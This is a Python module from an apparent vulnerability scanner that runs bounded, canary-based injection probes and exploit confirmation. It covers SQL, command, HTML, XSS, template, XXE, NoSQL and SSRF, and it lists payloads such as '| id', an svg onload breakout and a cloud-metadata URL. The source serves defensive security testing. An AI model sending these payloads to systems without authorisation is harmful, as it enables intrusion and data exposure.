"""Bounded injection probing for the OWASP A03 and A10 categories.

Every module here follows the same contract:

1. Read the attack-surface inventory produced by recon.
2. Send a small, benign, documented payload set per input point.
3. Classify the response as reflected / error / timing / differential.
4. Record request metadata and the response signal — never body content,
   secrets, tokens, or credentials.
5. Emit a normalized candidate finding that requires manual validation.

Payloads are canary-based. Nothing here deletes, updates, or creates data on the
target, and no payload attempts to open a connection back to the scanner.
"""

from __future__ import annotations

import json
import logging
import re
from dataclasses import dataclass, field
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

from app.config import settings
from app.models.schemas import AttackSurfaceItem, InjectionSignal, InputPointType, InjectionTestResult
from app.tasks.vulnscan.danger.budget import (
    CANARY,
    DangerBudget,
    ProbeResult,
    classify_signal,
    danger_finding,
    evidence_block,
    truncated,
)
from app.tasks.vulnscan.danger.exploit import (
    ExploitResult,
    confirm_command_injection,
    confirm_sql_injection,
    confirm_ssti,
    confirm_xss,
    exploitation_summary,
)
from app.tasks.vulnscan.danger.payloads import (
    SQL_DETECTION,
    SQL_ERROR_SIGNATURES,
    XSS_DETECTION,
    sql_error_flavour,
)
from app.tasks.vulnscan.danger.remediation import remediation_for

logger = logging.getLogger("recontitan.danger.injection")

A03 = "A03:2021-Injection"
A10 = "A10:2021-Server-Side Request Forgery"

#: Headers that applications frequently reflect or log unescaped.
REFLECTED_HEADERS = ("User-Agent", "X-Forwarded-For", "Referer")

#: Every DBMS error signature flattened once, for the broad detection pass.
ALL_SQL_ERROR_MARKERS: tuple[str, ...] = tuple(
    marker for markers in SQL_ERROR_SIGNATURES.values() for marker in markers
)

SQL_ERROR_MARKERS = (
    "sql syntax", "mysql_fetch", "mysqli", "you have an error in your sql",
    "unclosed quotation mark", "quoted string not properly terminated",
    "pg_query", "postgresql", "psqlexception", "ora-01756", "ora-00933",
    "sqlite3.operationalerror", "sqlstate", "odbc driver", "native client",
    "microsoft ole db provider", "incorrect syntax near",
)
NOSQL_ERROR_MARKERS = (
    "mongoerror", "castigator", "cast to objectid failed", "bson", "mongoose",
    "unknown operator", "$where", "e11000",
)
TEMPLATE_ENGINE_MARKERS = {
    "jinja2/flask": ("jinja2", "werkzeug", "flask"),
    "twig/symfony": ("twig", "symfony"),
    "freemarker": ("freemarker",),
    "velocity": ("velocity",),
    "handlebars": ("handlebars",),
    "erb/rails": ("actionview", "erb"),
}
XXE_ERROR_MARKERS = (
    "doctype is disallowed", "external entity", "entity is not defined",
    "xmlparseentityref", "saxparseexception", "xml parsing error", "undefined entity",
)
COMMAND_ERROR_MARKERS = (
    "sh: 1:", "/bin/sh", "command not found", "is not recognized as an internal",
    "cannot execute", "system cannot find the path",
)

#: Documented benign payload sets. Every payload is read-only.
SQL_PAYLOADS: tuple[tuple[str, str, str], ...] = (
    ("error", "'", "Single quote to provoke a parser error"),
    ("error", '"', "Double quote to provoke a parser error"),
    ("boolean_true", f"' OR '1'='1' -- {CANARY}", "Always-true boolean with a unique canary comment"),
    ("boolean_false", f"' AND '1'='2' -- {CANARY}", "Always-false boolean with a unique canary comment"),
    ("union", f"' UNION SELECT NULL -- {CANARY}", "Single-column UNION probe selecting NULL only"),
)
COMMAND_PAYLOADS: tuple[tuple[str, str, str], ...] = (
    ("separator_echo", f";echo {CANARY}", "Semicolon separator with a benign echo canary"),
    ("pipe_id", "| id", "Pipe to id; discloses identity without changing state"),
    ("subshell_printf", f"$(printf {CANARY})", "Subshell printf canary"),
    ("backtick_printf", f"`printf {CANARY}`", "Backtick printf canary"),
    ("newline_echo", f"%0aecho {CANARY}", "Encoded newline separator with a benign echo canary"),
)
HTML_PAYLOADS: tuple[tuple[str, str, str], ...] = (
    ("html_bold", f"<b>{CANARY}</b>", "Inert bold tag; detects unescaped HTML rendering"),
    ("html_comment", f"<!-- {CANARY} -->", "Inert HTML comment"),
)
XSS_PAYLOADS: tuple[tuple[str, str, str], ...] = (
    ("script_marker", f"<script>window.__recontitan='{CANARY}'</script>", "Inert script that only sets a window property"),
    ("attribute_break", f'"><svg onload="window.__recontitan=\'{CANARY}\'">', "Attribute break with an inert svg handler"),
    ("javascript_uri", f"javascript:void('{CANARY}')", "Inert javascript: URI probe for href/src sinks"),
)
SSTI_PAYLOADS: tuple[tuple[str, str, str], ...] = (
    ("jinja_twig", "{{7*7}}", "Jinja2/Twig arithmetic canary; expects 49"),
    ("dollar_brace", "${7*7}", "JSP/Freemarker/JS template arithmetic canary"),
    ("hash_brace", "#{7*7}", "Ruby/Thymeleaf arithmetic canary"),
    ("velocity", "#set($x=7*7)$x", "Velocity arithmetic canary"),
)
SSRF_TARGETS: tuple[tuple[str, str, str], ...] = (
    ("loopback", "http://127.0.0.1:9/recontitan-ssrf-canary", "Loopback discard port; only the scanner's own target may answer"),
    ("link_local", "http://169.254.169.254/recontitan-ssrf-canary", "Cloud metadata address; never fetched by the scanner itself"),
)
NOSQL_PAYLOADS: tuple[tuple[str, str, str], ...] = (
    ("operator_ne", '{"$ne": null}', "MongoDB $ne operator canary"),
    ("operator_gt", '{"$gt": ""}', "MongoDB $gt operator canary"),
)
XXE_PAYLOAD_BENIGN = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    f'<!DOCTYPE recontitan [<!ENTITY {CANARY.lower()} "{CANARY}">]>'
    f"<recontitan>&{CANARY.lower()};</recontitan>"
)
XXE_PAYLOAD_NO_ENTITY = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    "<recontitan><probe>ReconTitan XXE detection probe</probe></recontitan>"
)


@dataclass
class InjectionContext:
    """Shared state for one danger scan's injection stages."""

    target: str
    budget: DangerBudget
    items: list[AttackSurfaceItem] = field(default_factory=list)
    matrix: list[InjectionTestResult] = field(default_factory=list)
    command_candidates: list[dict] = field(default_factory=list)
    #: Confirmed exploits, used for the report's exploitation summary.
    exploits: list[ExploitResult] = field(default_factory=list)

    def testable(self, *, with_params: bool = True) -> list[AttackSurfaceItem]:
        selected = [item for item in self.items if item.parameters or not with_params]
        return selected[: settings.DANGER_MAX_ENDPOINTS]

    def record(
        self,
        item: AttackSurfaceItem,
        parameter: str,
        injection_type: str,
        payload_category: str,
        signal: InjectionSignal,
        probe: ProbeResult,
    ) -> None:
        self.matrix.append(InjectionTestResult(
            endpoint=item.url[:2000],
            method=item.method,
            parameter=parameter[:200],
            injection_type=injection_type,
            payload_category=payload_category,
            signal=signal,
            status_code=probe.status,
            response_bytes=probe.size,
            elapsed_seconds=round(probe.elapsed, 3),
        ))


def _with_query_param(url: str, parameter: str, value: str) -> str:
    split = urlsplit(url)
    pairs = [(name, existing) for name, existing in parse_qsl(split.query, keep_blank_values=True)]
    replaced = False
    updated: list[tuple[str, str]] = []
    for name, existing in pairs:
        if name == parameter:
            updated.append((name, value))
            replaced = True
        else:
            updated.append((name, existing))
    if not replaced:
        updated.append((parameter, value))
    return urlunsplit((split.scheme, split.netloc, split.path, urlencode(updated), split.fragment))


def send_payload(
    context: InjectionContext,
    module: str,
    item: AttackSurfaceItem,
    parameter: str,
    payload: str,
    *,
    timeout: float | None = None,
) -> ProbeResult:
    """Send one payload to one parameter using the input point's own transport."""
    if item.method == "POST":
        if item.content_type and "json" in item.content_type:
            body = json.dumps({name: (payload if name == parameter else "1") for name in item.parameters})
            headers = {"Content-Type": "application/json"}
        else:
            body = urlencode({name: (payload if name == parameter else "1") for name in item.parameters})
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
        return context.budget.probe(
            module, "POST", item.url, headers=headers, body=body.encode("utf-8"), timeout=timeout
        )
    return context.budget.probe(module, "GET", _with_query_param(item.url, parameter, payload), timeout=timeout)


def _baseline(context: InjectionContext, module: str, item: AttackSurfaceItem) -> ProbeResult:
    if item.method == "POST":
        body = urlencode({name: "1" for name in item.parameters})
        return context.budget.probe(
            module,
            "POST",
            item.url,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            body=body.encode("utf-8"),
            counts_as_payload=False,
        )
    return context.budget.probe(module, "GET", item.url, counts_as_payload=False)


def _candidate_finding(
    *,
    module: str,
    category: str,
    severity: str,
    title: str,
    description: str,
    item: AttackSurfaceItem,
    parameter: str,
    payload_category: str,
    payload_description: str,
    signal: InjectionSignal,
    probe: ProbeResult,
    remediation: str,
    owasp: str,
    attack_vector: str,
    extra: list[tuple[str, object]] | None = None,
    exploit: ExploitResult | None = None,
) -> dict:
    """Build an injection finding, promoting it when exploitation was proven.

    A confirmed exploit changes the title, the severity floor, and the evidence
    — the report must make the difference between "looks injectable" and "proven
    injectable" impossible to miss.
    """
    confirmed = bool(exploit and exploit.confirmed)
    if confirmed:
        title = f"[EXPLOITED] {title}"
        severity = {"info": "medium", "low": "medium", "medium": "high"}.get(severity, severity)

    finding = danger_finding(
        tool=module,
        category=category,
        severity=severity,
        title=title,
        description=description,
        evidence=evidence_block([
            ("Method", item.method),
            ("Endpoint", truncated(item.url, 300)),
            ("Parameter", parameter or "(request body)"),
            ("Input point type", item.input_type.value),
            ("Payload category", payload_category),
            ("Payload intent", payload_description),
            ("Response signal", signal.value),
            ("Response status", probe.status),
            ("Response bytes", probe.size),
            ("Elapsed seconds", round(probe.elapsed, 3)),
            *(exploit.as_evidence() if exploit else []),
            *(extra or []),
        ]),
        remediation=remediation,
        owasp=owasp,
        attack_vector=attack_vector,
        asset=item.url,
        confidence="CONFIRMED by exploitation" if confirmed else "Candidate - requires manual validation",
    )
    if confirmed and exploit is not None:
        finding["exploited"] = True
        finding["exploit_technique"] = exploit.technique
        finding["exploit_proof"] = f"{exploit.proof_type}: {exploit.proof_value}"
        finding["exploit_impact"] = exploit.impact
    return finding


# ── A03: SQL injection ────────────────────────────────────────────────────────

def _current_value(item: AttackSurfaceItem, parameter: str) -> str:
    """The parameter's existing value, which confirmation payloads build on."""
    for name, value in parse_qsl(urlsplit(item.url).query, keep_blank_values=True):
        if name == parameter:
            return value
    return "1"


def run_sql_injection(context: InjectionContext) -> list[dict]:
    """Detect, then prove, SQL injection.

    Detection is broad and cheap. The moment a parameter shows any signal, the
    exploitation engine runs a boolean differential and — only if that holds —
    reads back a database version banner as proof.
    """
    module = "injection_sqli"
    findings: list[dict] = []
    #: Blind injection produces no detection signal at all, so a bounded number
    #: of parameters get a differential attempt even when detection is silent.
    blind_attempts_left = 6

    for item in context.testable():
        baseline = _baseline(context, module, item)
        for parameter in item.parameters[:5]:
            if not context.budget.can_spend(module):
                break

            signal = InjectionSignal.NONE
            probe: ProbeResult | None = None
            matched_payload = SQL_DETECTION[0]
            for probe_payload in SQL_DETECTION:
                candidate = send_payload(context, module, item, parameter, probe_payload.value)
                candidate_signal = classify_signal(baseline, candidate, error_markers=ALL_SQL_ERROR_MARKERS)
                context.record(item, parameter, "sql", probe_payload.category, candidate_signal, candidate)
                if candidate_signal is not InjectionSignal.NONE:
                    signal, probe, matched_payload = candidate_signal, candidate, probe_payload
                    break
                probe = candidate

            blind_probe = signal is InjectionSignal.NONE and blind_attempts_left > 0
            if signal is InjectionSignal.NONE and not blind_probe:
                continue
            if blind_probe:
                blind_attempts_left -= 1

            value = _current_value(item, parameter)
            exploit = confirm_sql_injection(
                lambda payload: send_payload(context, module, item, parameter, payload),
                baseline,
                value,
                lambda: context.budget.can_spend(module),
            )
            if blind_probe and not exploit.confirmed:
                continue  # silent detection and no proof: nothing to report
            if exploit.confirmed:
                context.exploits.append(exploit)
            flavour = exploit.flavour or sql_error_flavour(probe.text if probe else "")
            severity = "critical" if exploit.confirmed else (
                "high" if signal is InjectionSignal.ERROR else "medium"
            )
            findings.append(_candidate_finding(
                module=module,
                category="danger_injection_sql",
                severity=severity,
                title=f"SQL Injection - {parameter} ({matched_payload.category})",
                description=(
                    (
                        f"SQL injection was proven on '{parameter}'. {exploit.technique} succeeded, so the "
                        "database evaluates attacker-supplied SQL. "
                        if exploit.confirmed else
                        f"The parameter '{parameter}' responded to a SQL metacharacter probe with a "
                        f"{signal.value} signal, but the differential test did not hold, so this remains a "
                        "candidate rather than a proven injection. "
                    )
                    + (f"Database family identified as {flavour}. " if flavour else "")
                ),
                item=item, parameter=parameter,
                payload_category=matched_payload.category,
                payload_description=matched_payload.intent,
                signal=signal, probe=probe or baseline,
                remediation=remediation_for("sql_injection"),
                owasp=A03,
                attack_vector=exploit.technique or "SQL injection",
                extra=[
                    ("Baseline status", baseline.status),
                    ("Baseline bytes", baseline.size),
                    ("Database family", flavour or "not identified"),
                    ("Detection signal", "silent - found by differential only" if blind_probe else signal.value),
                ],
                exploit=exploit,
            ))

        findings.extend(_time_based_sql(context, module, item, baseline))
    findings.extend(_header_sql(context, module))
    return findings


def _time_based_sql(
    context: InjectionContext,
    module: str,
    item: AttackSurfaceItem,
    baseline: ProbeResult,
) -> list[dict]:
    """One bounded time-based probe per endpoint with a low, fixed delay."""
    delay = settings.DANGER_TIME_DELAY_SECONDS
    if not item.parameters or not context.budget.can_spend(module):
        return []
    parameter = item.parameters[0]
    payload = f"' AND (SELECT SLEEP({delay})) -- {CANARY}"
    probe = send_payload(context, module, item, parameter, payload, timeout=delay + 10)
    threshold = delay + max(1.0, baseline.elapsed)
    signal = InjectionSignal.TIMING if probe.ok and probe.elapsed >= threshold else InjectionSignal.NONE
    context.record(item, parameter, "sql", "time_based", signal, probe)
    if signal is not InjectionSignal.TIMING:
        return []
    return [_candidate_finding(
        module=module,
        category="danger_injection_sql",
        severity="high",
        title=f"Time-Based Blind SQL Injection Candidate - {parameter}",
        description=(
            f"A single bounded {delay}-second delay probe against '{parameter}' returned "
            f"{probe.elapsed:.1f}s against a {baseline.elapsed:.1f}s baseline. Response-time control is a strong "
            "indicator that input influences query execution, but network variance must be ruled out manually."
        ),
        item=item, parameter=parameter,
        payload_category="time_based",
        payload_description=f"Single {delay}s delay probe with a unique canary comment",
        signal=signal, probe=probe,
        remediation=(
            "Use parameterized queries, apply strict input validation, and add query timeouts so a single request "
            "cannot hold a database connection open."
        ),
        owasp=A03, attack_vector="Time-based blind SQL injection",
        extra=[("Baseline seconds", round(baseline.elapsed, 3)), ("Delay threshold", round(threshold, 3))],
    )]


def _header_sql(context: InjectionContext, module: str) -> list[dict]:
    """Probe reflected request headers that are frequently logged into queries."""
    findings: list[dict] = []
    for item in context.testable(with_params=False)[:3]:
        for header in REFLECTED_HEADERS:
            if not context.budget.can_spend(module):
                return findings
            baseline = context.budget.probe(module, "GET", item.url, counts_as_payload=False)
            probe = context.budget.probe(
                module, "GET", item.url, headers={header: f"ReconTitan/1.0 '{CANARY}"}
            )
            signal = classify_signal(baseline, probe, error_markers=SQL_ERROR_MARKERS)
            context.record(item, header, "sql", "header", signal, probe)
            if signal is InjectionSignal.ERROR:
                findings.append(_candidate_finding(
                    module=module,
                    category="danger_injection_sql",
                    severity="high",
                    title=f"SQL Injection Candidate in Request Header - {header}",
                    description=(
                        f"A quote character supplied in the {header} header produced a database error signature. "
                        "Headers are often written to audit or analytics tables without parameterization."
                    ),
                    item=item, parameter=header,
                    payload_category="header",
                    payload_description="Single quote appended to a normal header value",
                    signal=signal, probe=probe,
                    remediation=(
                        "Parameterize every query that stores request metadata, and treat headers as fully "
                        "untrusted input."
                    ),
                    owasp=A03, attack_vector="Header-borne SQL injection",
                ))
    return findings


# ── A03: Command injection ────────────────────────────────────────────────────

def run_command_injection(context: InjectionContext) -> list[dict]:
    """OS command-injection probing with benign canaries only.

    Candidates are recorded so :mod:`reverse_shell` can describe the vector.
    No payload here ever opens a connection or executes a destructive command.
    """
    module = "injection_command"
    findings: list[dict] = []
    shell_reaching = [
        item for item in context.testable()
        if item.input_type in {InputPointType.UPLOAD_FORM, InputPointType.GENERIC_FORM,
                               InputPointType.API_ENDPOINT, InputPointType.QUERY_PARAM,
                               InputPointType.SEARCH_FORM}
    ]
    for item in shell_reaching:
        baseline = _baseline(context, module, item)
        for parameter in item.parameters[:4]:
            if not context.budget.can_spend(module):
                break
            for payload_category, payload, payload_description in COMMAND_PAYLOADS:
                probe = send_payload(context, module, item, parameter, payload)
                direct = probe.ok and CANARY in probe.text
                signal = InjectionSignal.REFLECTED if direct else classify_signal(
                    baseline, probe, error_markers=COMMAND_ERROR_MARKERS
                )
                context.record(item, parameter, "command", payload_category, signal, probe)
                if signal is InjectionSignal.NONE:
                    continue
                context_kind = "direct output" if direct else "blind"
                # Prove execution with shell arithmetic, then name the OS.
                exploit = confirm_command_injection(
                    lambda payload: send_payload(context, module, item, parameter, payload),
                    lambda: context.budget.can_spend(module),
                )
                if exploit.confirmed:
                    context.exploits.append(exploit)
                    context_kind = "direct output"

                candidate = {
                    "url": item.url,
                    "method": item.method,
                    "parameter": parameter,
                    "context": context_kind,
                    "payload_category": payload_category,
                    "signal": signal.value,
                    "input_type": item.input_type.value,
                    "confirmed": exploit.confirmed,
                    "platform": exploit.flavour,
                }
                context.command_candidates.append(candidate)
                severity = "critical" if (exploit.confirmed or direct) else "high"
                findings.append(_candidate_finding(
                    module=module,
                    category="danger_injection_command",
                    severity=severity,
                    title=f"Command Injection ({context_kind}) - {parameter}",
                    description=(
                        (
                            f"Command execution was proven on '{parameter}'. The target evaluated a shell "
                            "arithmetic expression and returned the computed result, which no filter or cache "
                            "could produce by accident. "
                            if exploit.confirmed else
                            f"The parameter '{parameter}' responded to a benign shell-metacharacter canary with a "
                            f"{signal.value} signal, classified as {context_kind}, but arithmetic evaluation was "
                            "not observed, so execution is not proven. "
                        )
                        + "Only echo and arithmetic were used; nothing was created, modified, or deleted, and no "
                        "outbound connection was made from the target."
                    ),
                    item=item, parameter=parameter,
                    payload_category=payload_category, payload_description=payload_description,
                    signal=signal, probe=probe,
                    remediation=remediation_for("command_injection"),
                    owasp=A03,
                    attack_vector=exploit.technique or f"OS command injection ({context_kind})",
                    extra=[("Canary observed in response", "yes" if direct else "no")],
                    exploit=exploit,
                ))
                break
    return findings


# ── A03: HTML injection ───────────────────────────────────────────────────────

def run_html_injection(context: InjectionContext) -> list[dict]:
    """Detect unescaped HTML rendering with inert markup canaries."""
    module = "injection_html"
    findings: list[dict] = []
    for item in context.testable():
        for parameter in item.parameters[:4]:
            if not context.budget.can_spend(module):
                return findings
            for payload_category, payload, payload_description in HTML_PAYLOADS:
                probe = send_payload(context, module, item, parameter, payload)
                rendered = probe.ok and payload in probe.text
                signal = InjectionSignal.REFLECTED if rendered else InjectionSignal.NONE
                context.record(item, parameter, "html", payload_category, signal, probe)
                if not rendered:
                    continue
                findings.append(_candidate_finding(
                    module=module,
                    category="danger_injection_html",
                    severity="medium",
                    title=f"HTML Injection Candidate - {parameter}",
                    description=(
                        f"An inert HTML canary submitted through '{parameter}' was returned unescaped in the "
                        "response body. Unescaped markup lets an attacker restructure the page, spoof interface "
                        "elements, or stage a script-injection payload."
                    ),
                    item=item, parameter=parameter,
                    payload_category=payload_category, payload_description=payload_description,
                    signal=signal, probe=probe,
                    remediation=(
                        "Encode output contextually before rendering user-supplied values, and prefer templating "
                        "engines that escape by default."
                    ),
                    owasp=A03, attack_vector="HTML injection",
                ))
                break
    return findings


# ── A03: JavaScript injection / XSS ───────────────────────────────────────────

_DOM_SINK_RE = re.compile(
    r"(document\.write|innerHTML\s*=|outerHTML\s*=|insertAdjacentHTML|eval\s*\(|"
    r"location\.hash|location\.search|document\.URL)",
    re.IGNORECASE,
)


def run_xss(context: InjectionContext) -> list[dict]:
    """Reflected, stored, and DOM-based XSS detection with inert probes."""
    module = "injection_xss"
    findings: list[dict] = []
    stored_seen: dict[str, AttackSurfaceItem] = {}

    for item in context.testable():
        for parameter in item.parameters[:4]:
            if not context.budget.can_spend(module):
                break
            for probe_payload in XSS_DETECTION:
                probe = send_payload(context, module, item, parameter, probe_payload.value)
                reflected = probe.ok and (probe_payload.value in probe.text or CANARY in probe.text)
                signal = InjectionSignal.REFLECTED if reflected else InjectionSignal.NONE
                context.record(item, parameter, "xss", probe_payload.category, signal, probe)
                if not reflected:
                    continue

                # Reflection is not XSS. Determine whether the characters needed
                # to break out of this context survived encoding.
                exploit = confirm_xss(
                    lambda payload: send_payload(context, module, item, parameter, payload),
                    probe_payload,
                    CANARY,
                    lambda: context.budget.can_spend(module),
                )
                if exploit.confirmed:
                    context.exploits.append(exploit)
                sink_context = exploit.flavour or "html_body"
                severity = "critical" if exploit.confirmed else "low"
                findings.append(_candidate_finding(
                    module=module,
                    category="danger_injection_xss",
                    severity=severity,
                    title=f"Reflected XSS - {parameter} ({sink_context} context)",
                    description=(
                        (
                            f"Cross-site scripting was proven on '{parameter}'. The payload reaches "
                            f"{sink_context} context with the breakout characters unescaped, so injected script "
                            "executes under this origin. "
                            if exploit.confirmed else
                            f"The value submitted through '{parameter}' is reflected into {sink_context} context, "
                            "but the characters required to break out are encoded, so it is not exploitable as "
                            "written. It is recorded because a future encoding change would make it so. "
                        )
                        + "The probe only sets a window property and takes no action in a browser."
                    ),
                    item=item, parameter=parameter,
                    payload_category=probe_payload.category,
                    payload_description=probe_payload.intent,
                    signal=signal, probe=probe,
                    remediation=remediation_for("xss"),
                    owasp=A03,
                    attack_vector=exploit.technique or f"Reflected cross-site scripting ({sink_context})",
                    extra=[("Sink context", sink_context)],
                    exploit=exploit,
                ))
                if item.method == "POST":
                    stored_seen[item.url] = item
                break

    findings.extend(_stored_xss(context, module, stored_seen))
    findings.extend(_dom_xss(context, module))
    return findings


def _stored_xss(context: InjectionContext, module: str, submitted: dict[str, AttackSurfaceItem]) -> list[dict]:
    """Re-fetch endpoints that accepted a canary to see whether it persisted."""
    findings: list[dict] = []
    for url, item in list(submitted.items())[:5]:
        if not context.budget.can_spend(module):
            break
        probe = context.budget.probe(module, "GET", url, counts_as_payload=False)
        if not probe.ok or CANARY not in probe.text:
            context.record(item, "(persistence)", "xss", "stored", InjectionSignal.NONE, probe)
            continue
        context.record(item, "(persistence)", "xss", "stored", InjectionSignal.REFLECTED, probe)
        findings.append(_candidate_finding(
            module=module,
            category="danger_injection_xss",
            severity="high",
            title="Stored XSS Candidate - canary persisted after submission",
            description=(
                "A canary submitted to this endpoint was still present when the page was re-fetched in a separate "
                "request, which indicates the value is stored and re-rendered. Persistent script injection affects "
                "every subsequent viewer, not just the submitter."
            ),
            item=item, parameter="(persistence)",
            payload_category="stored",
            payload_description="Re-fetch of a previously submitted inert canary",
            signal=InjectionSignal.REFLECTED, probe=probe,
            remediation=(
                "Encode stored values at render time, sanitize rich content with a vetted allow-list library, and "
                "enforce a strict Content Security Policy."
            ),
            owasp=A03, attack_vector="Stored cross-site scripting",
        ))
    return findings


def _dom_xss(context: InjectionContext, module: str) -> list[dict]:
    """Flag pages whose scripts move URL-controlled data into a DOM sink."""
    findings: list[dict] = []
    for item in context.testable(with_params=False)[:5]:
        if not context.budget.can_spend(module):
            break
        probe = context.budget.probe(module, "GET", item.url, counts_as_payload=False)
        if not probe.ok:
            continue
        sinks = sorted({match.group(0) for match in _DOM_SINK_RE.finditer(probe.text)})
        source_present = any(source in probe.text for source in ("location.hash", "location.search", "document.URL"))
        sink_present = any(not sink.startswith("location") and sink != "document.URL" for sink in sinks)
        if not (sinks and source_present and sink_present):
            continue
        context.record(item, "(dom)", "xss", "dom_based", InjectionSignal.DIFFERENTIAL, probe)
        findings.append(_candidate_finding(
            module=module,
            category="danger_injection_xss",
            severity="medium",
            title="DOM-Based XSS Candidate - URL source reaches a DOM sink",
            description=(
                "Client-side script on this page reads a URL-controlled source and also writes to a DOM sink. "
                "Static co-occurrence is not proof of a data path; trace the source to the sink in a debugger to "
                "confirm."
            ),
            item=item, parameter="(dom)",
            payload_category="dom_based",
            payload_description="Static source/sink co-occurrence analysis of the returned page",
            signal=InjectionSignal.DIFFERENTIAL, probe=probe,
            remediation=(
                "Use textContent or safe DOM APIs instead of innerHTML, sanitize before writing, and adopt Trusted "
                "Types where supported."
            ),
            owasp=A03, attack_vector="DOM-based cross-site scripting",
            extra=[("Sinks and sources observed", ", ".join(sinks[:10]))],
        ))
    return findings


# ── A03: SSTI ─────────────────────────────────────────────────────────────────

def run_ssti(context: InjectionContext) -> list[dict]:
    """Template-injection probing with arithmetic canaries."""
    module = "injection_ssti"
    findings: list[dict] = []
    for item in context.testable():
        for parameter in item.parameters[:4]:
            if not context.budget.can_spend(module):
                return findings

            exploit = confirm_ssti(
                lambda payload: send_payload(context, module, item, parameter, payload),
                lambda: context.budget.can_spend(module),
            )
            probe = send_payload(context, module, item, parameter, "recontitan-ssti-baseline")
            signal = InjectionSignal.REFLECTED if exploit.confirmed else InjectionSignal.NONE
            context.record(item, parameter, "ssti", "arithmetic", signal, probe)
            if not exploit.confirmed:
                continue

            context.exploits.append(exploit)
            engines = [
                name for name, markers in TEMPLATE_ENGINE_MARKERS.items()
                if any(marker in probe.text.lower() for marker in markers)
            ]
            findings.append(_candidate_finding(
                module=module,
                category="danger_injection_ssti",
                severity="critical",
                title=f"Server-Side Template Injection - {parameter}",
                description=(
                    f"Template injection was proven on '{parameter}'. The server evaluated an arithmetic "
                    "expression supplied in the parameter and returned the computed result, while the literal "
                    "expression did not appear. On most engines this escalates from expression evaluation to "
                    "object access and remote code execution."
                ),
                item=item, parameter=parameter,
                payload_category="arithmetic",
                payload_description=f"Arithmetic canary for {exploit.flavour}",
                signal=signal, probe=probe,
                remediation=remediation_for("ssti"),
                owasp=A03,
                attack_vector=exploit.technique or "Server-side template injection",
                extra=[
                    ("Template engine syntax", exploit.flavour or "not identified"),
                    ("Engine banner signals", ", ".join(engines) or "none in response"),
                ],
                exploit=exploit,
            ))
            break
    return findings


# ── A03: XXE ──────────────────────────────────────────────────────────────────

def run_xxe(context: InjectionContext) -> list[dict]:
    """XML endpoint probing with an internal-entity canary only.

    The probe defines a local entity that resolves to a fixed string. No external
    entity, no file read, and no out-of-band channel is used unless
    ``DANGER_ENABLE_XXE_OOB`` is set, which is off by default and unimplemented
    on purpose.
    """
    module = "injection_xxe"
    findings: list[dict] = []
    xml_items = [
        item for item in context.testable(with_params=False)
        if item.method == "POST" or item.input_type == InputPointType.API_ENDPOINT
    ][:5]

    for item in xml_items:
        if not context.budget.can_spend(module):
            break
        control = context.budget.probe(
            module, "POST", item.url,
            headers={"Content-Type": "application/xml"},
            body=XXE_PAYLOAD_NO_ENTITY.encode("utf-8"),
            counts_as_payload=False,
        )
        probe = context.budget.probe(
            module, "POST", item.url,
            headers={"Content-Type": "application/xml"},
            body=XXE_PAYLOAD_BENIGN.encode("utf-8"),
        )
        if not probe.ok:
            context.record(item, "(xml body)", "xxe", "internal_entity", InjectionSignal.NONE, probe)
            continue
        expanded = CANARY in probe.text
        signal = (
            InjectionSignal.REFLECTED if expanded
            else classify_signal(control, probe, error_markers=XXE_ERROR_MARKERS)
        )
        context.record(item, "(xml body)", "xxe", "internal_entity", signal, probe)
        if signal is InjectionSignal.NONE:
            continue
        severity = "high" if expanded else "medium"
        findings.append(_candidate_finding(
            module=module,
            category="danger_injection_xxe",
            severity=severity,
            title="XML External Entity Candidate - entity processing observed",
            description=(
                "The endpoint accepted an XML document containing a DOCTYPE with an internal entity and "
                + ("expanded that entity into the response. " if expanded else "returned an entity-related parser signal. ")
                + "A parser that expands entities at all is typically also willing to resolve external ones, which "
                "enables file disclosure and server-side request forgery. Only a harmless internal entity was sent."
            ),
            item=item, parameter="(xml body)",
            payload_category="internal_entity",
            payload_description="DOCTYPE with a single internal entity resolving to a fixed canary string",
            signal=signal, probe=probe,
            remediation=(
                "Disable DTD processing and external entity resolution in every XML parser, or use a data format "
                "without entity support."
            ),
            owasp=A03, attack_vector="XML external entity processing",
            extra=[
                ("Canary entity expanded", "yes" if expanded else "no"),
                ("Out-of-band probing", "disabled" if not settings.DANGER_ENABLE_XXE_OOB else "enabled by operator"),
            ],
        ))
    return findings


# ── A03: NoSQL injection ──────────────────────────────────────────────────────

def run_nosql_injection(context: InjectionContext) -> list[dict]:
    """MongoDB-style operator probing on JSON and query parameters."""
    module = "injection_nosql"
    findings: list[dict] = []
    for item in context.testable():
        baseline = _baseline(context, module, item)
        for parameter in item.parameters[:3]:
            if not context.budget.can_spend(module):
                return findings
            for payload_category, payload, payload_description in NOSQL_PAYLOADS:
                if item.method == "POST" and item.content_type and "json" in item.content_type:
                    body = json.dumps({
                        name: (json.loads(payload) if name == parameter else "1")
                        for name in item.parameters
                    })
                    probe = context.budget.probe(
                        module, "POST", item.url,
                        headers={"Content-Type": "application/json"},
                        body=body.encode("utf-8"),
                    )
                else:
                    probe = send_payload(context, module, item, f"{parameter}[$ne]", "")
                signal = classify_signal(baseline, probe, error_markers=NOSQL_ERROR_MARKERS)
                context.record(item, parameter, "nosql", payload_category, signal, probe)
                if signal is InjectionSignal.NONE:
                    continue
                findings.append(_candidate_finding(
                    module=module,
                    category="danger_injection_nosql",
                    severity="high" if signal is InjectionSignal.ERROR else "medium",
                    title=f"NoSQL Injection Candidate - {parameter}",
                    description=(
                        f"Submitting a MongoDB query operator through '{parameter}' produced a {signal.value} "
                        "signal. Document databases that accept operator objects from user input allow filter "
                        "bypass and authentication bypass."
                    ),
                    item=item, parameter=parameter,
                    payload_category=payload_category, payload_description=payload_description,
                    signal=signal, probe=probe,
                    remediation=(
                        "Cast request values to their expected scalar type before they reach a query, reject keys "
                        "beginning with '$', and validate request bodies against a schema."
                    ),
                    owasp=A03, attack_vector="NoSQL operator injection",
                    extra=[("Baseline status", baseline.status), ("Baseline bytes", baseline.size)],
                ))
                break
    return findings


# ── A10: SSRF ─────────────────────────────────────────────────────────────────

def run_ssrf(context: InjectionContext) -> list[dict]:
    """Probe URL-accepting parameters with private canary addresses.

    The scanner never fetches the canary itself and never scans third-party
    hosts. Only a response or timing differential against a control value is
    reported.
    """
    module = "injection_ssrf"
    findings: list[dict] = []
    url_items = [
        item for item in context.testable()
        if item.input_type == InputPointType.URL_PARAM
        or any(re.fullmatch(
